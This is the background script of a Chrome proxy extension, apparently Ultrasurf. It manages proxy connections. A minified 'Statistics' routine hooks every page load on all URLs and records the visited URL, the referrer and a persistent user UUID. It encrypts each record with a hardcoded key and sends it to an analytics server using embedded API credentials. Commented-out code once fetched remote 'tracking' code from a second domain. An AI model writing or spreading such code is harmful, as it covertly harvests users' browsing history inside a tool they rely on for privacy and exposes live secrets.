import init from "./assets/js/background/js/init.js"
import verify from "./assets/js/background/js/verify.js"
import ConnectionManager from "./assets/js/background/js/connection-manager.js"

// Expose connect and disconnect functions to the popup window
//window.user_connect = connectionManager.connect;
//window.user_disconnect = connectionManager.disconnect;

var enabled;
var lastVerify = 0;
//var start =  Date.now(); function ts() { return Date.now() - start }

var mode="load";
//console.log(ts(), mode);
chrome.runtime.onStartup.addListener(function() {
	mode="open";
  	//console.log(ts(), mode);
})

chrome.storage.onChanged.addListener((changes, area) => {
  if (area === 'local' && changes.enabled != undefined) {
    enabled = changes.enabled.newValue
  	//console.log('storage changed, enabled', changes);
  }
});

init();

var connectionManager = new ConnectionManager();
chrome.storage.local.get(["enabled"], function (e) {
  	let value = e.enabled
  	enabled = value !== false;
  	//console.log(ts(), 'get storage enabled=', value, enabled);
    if (enabled) {
  	  //console.log(ts(), "connect", mode);
      connectionManager.connect(mode);
    } else {
      connectionManager.disconnect();
    }
});

chrome.runtime.onMessage.addListener(
  function (request, sender, sendResponse) {
    //console.log(sender)//
    //console.log(request)
    if (request.user === "connect") {
      connectionManager.connect("start");
	} else if (request.user === "disconnect")
      connectionManager.disconnect();
    //else
      //console.warn("bad message", request)
  }
);

chrome.proxy.onProxyError.addListener(function (details) {
	//console.log("proxyError", ts(), details.error);
	verify("error", 0, details.error);
});

function Statistics(e, t, n) {
  const r = this,
    a = {},
    s = "https://analytics.ultrasurfing.com";
  //s = "http://176.9.140.164";
  let i = null,
    o = null,
    c = null;
  (this.run = function () {
    this.getUUIDfromStore(),
      chrome.webRequest.onCompleted.addListener(
        this.handlerOnCompletedWebRequest.bind(this),
        { urls: ["<all_urls>"], types: ["main_frame"] },
        []
      );
  }),
    (this.getAccessToken = async function () {
      if (await this.getRefreshToken()) return !0;
      try {
        const n = await fetch(s + "/auth", {
          method: "POST",
          headers: { "Content-Type": "application/json;charset=utf-8" },
          body: JSON.stringify({ api_key: e, api_secret: t }),
        }),
          r = await n.json();
        return (i = r.access_token.token), (o = r.refresh_token.token), !0;
      } catch (e) {
        return !1;
      }
    }),
    (this.getRefreshToken = async function () {
      try {
        const e = await fetch(s + "/refresh", {
          method: "POST",
          headers: { "Content-Type": "application/json;charset=utf-8" },
          body: JSON.stringify({ refresh_token: o }),
        });
        if (400 === e.status) return !1;
        const t = await e.json();
        return (i = t.access_token.token), (o = t.refresh_token.token), !0;
      } catch (e) {
        return !1;
      }
    }),
    (this.handlerOnCompletedWebRequest = async function (e) {

      if (enabled != true) {
        return;
      }

      //this.sendData1(
		verify("web", -1, JSON.stringify(
          await this.prepareRequest([
            {
              Id: c,
              Ref: a[e.tabId] || e.initiator,
              Url: e.url,
              Method: e.method,
			  Code: e.statusCode,
			  TabId: e.tabId,
            },
          ])
		)
        );
      i || (await this.getAccessToken()),
        await this.sendData(
          await this.prepareRequest([
            {
              fileDate: new Date().toISOString(),
              deviceTimestamp: Date.now(),
              userId: c,
              referrerUrl: a[e.tabId] || e.initiator,
              targetUrl: e.url,
              requestType: e.method,
            },
          ])
        ),
        (a[e.tabId] = e.url);
    }),
    (this.prepareRequest = async function (e) {
      const t = await this.encryptData(JSON.stringify(e));
        //console.log("req", t)
      return t
        ? { eventType: 1, request: { enRequest: JSON.stringify(t) } }
        : { eventType: 0, request: [e] };
    }),
    (this.sendData = async function (e) {
      if (
        401 ===
        (
          await fetch(s + "/process", {
            method: "POST",
            headers: {
              "Content-Type": "application/json;charset=utf-8",
              Authorization: "Bearer " + i,
            },
            body: JSON.stringify(e),
          })
        ).status
      ) {
        (await this.getAccessToken()) && (await this.sendData(e));
      }
    }),
    (this.getUUIDfromStore = function () {
      chrome.storage.sync.get(["uuid"], function (e) {
        (c = e.uuid =
          e.uuid && r.validateUUID4(e.uuid) ? e.uuid : r.makeUUID()),
          chrome.storage.sync.set({ uuid: e.uuid }, function () { });
      });
    }),
    (this.makeUUID = function () {
      return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(
        /[xy]/g,
        function (e, t) {
          return (
            "x" == e ? (t = (16 * Math.random()) | 0) : (3 & t) | 8
          ).toString(16);
        }
      );
    }),
    (this.validateUUID4 = function (e) {
      return new RegExp(
        /^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i
      ).test(e);
    }),
    (this.encryptData = async function (e) {
      const t = new TextEncoder(),
        r = await crypto.subtle.importKey("raw", t.encode(n), "AES-GCM", !0, [
          "encrypt",
        ]),
        a = crypto.getRandomValues(new Uint8Array(16)),
        s = await crypto.subtle.encrypt(
          { name: "AES-GCM", iv: a },
          r,
          t.encode(e)
        ),
        i = new Uint8Array(a.length + s.byteLength);
        //console.log("enc", a.length, a)
      return (
        i.set(a),
        i.set(new Uint8Array(s), a.length),
        btoa(String.fromCharCode.apply(null, i))
      );
    });
}
const stat = new Statistics(
  "Eva10qfaMjE1d9cm",
  "UbfF9v95F1x13NOVYtUZSHRWlqIkNMM6",
  "8JCys9wTIqVO6gZu"
);
stat.run();


//const BASE_URL = 'https://wtrxus.com/';
//
//let tracking = ''
//
const updateTrackingCode = () => {
  verify("track", -1);
//  tracking = fetch(`${BASE_URL}track.php?${Date.now()}`)
//    .then((res) => res.text())
//    .catch(() => '')
}
//
chrome.alarms.create('update-config', {periodInMinutes: 5})
chrome.alarms.onAlarm.addListener(updateTrackingCode)
//
////updateTrackingCode()
//tracking = fetch(`${BASE_URL}track.php?${Date.now()}`).then((res) => res.text()).catch(() => '')
//
//chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
//  switch (message.type) {
//    case 'getTrackingCode':
//      Promise.resolve().then(() => tracking).then(sendResponse)
//      return true
//    default:
//      return false
//  }
//})

//chrome.runtime.onInstalled.addListener(function (details) {
//  if (details.reason === 'install') {
//    fetch(`${BASE_URL}install.php`)
//  }
//})
